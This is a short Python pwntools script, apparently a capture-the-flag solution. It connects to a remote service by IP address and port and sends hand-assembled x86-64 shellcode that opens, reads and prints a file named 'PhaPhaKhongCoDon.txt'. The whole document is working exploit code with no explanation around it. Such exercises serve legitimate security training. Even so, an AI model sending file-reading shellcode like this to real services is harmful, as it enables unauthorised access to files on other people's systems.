from pwn import *

#p = process('./shellcode')
r = remote('45.122.249.68', 10017)

shellcode = asm('\n'.join([
	'mov rbx, %d' % u64(b'.txt\x00\x00\x00\x00'),
	'push rbx',
	'mov rbx, %d' % u64(b'ongCoDon'),
	'push rbx',
	'mov rbx, %d' % u64(b'PhaPhaKh'),
	'push rbx', 
	'mov	rdi, rsp',		
	'mov	rsi, 0',
	'mov 	rdx, 0',	
	'mov	rax, 2',	
	'syscall',
	'mov	rdi, rax',
	'mov	rsi, rsp',
	'mov	rdx, 0x100',
	'mov 	rax, 0',
	'syscall',
	'mov	rdi, 1',
	'mov	rsi, rsp',
	'mov	rdx, rax',
	'mov 	rax, 1',
    'syscall',
]), arch='amd64', os='linux')

r.recvuntil(b'PhaPhaKhongCoDon.txt\n')
r.sendline(shellcode)
r.interactive()

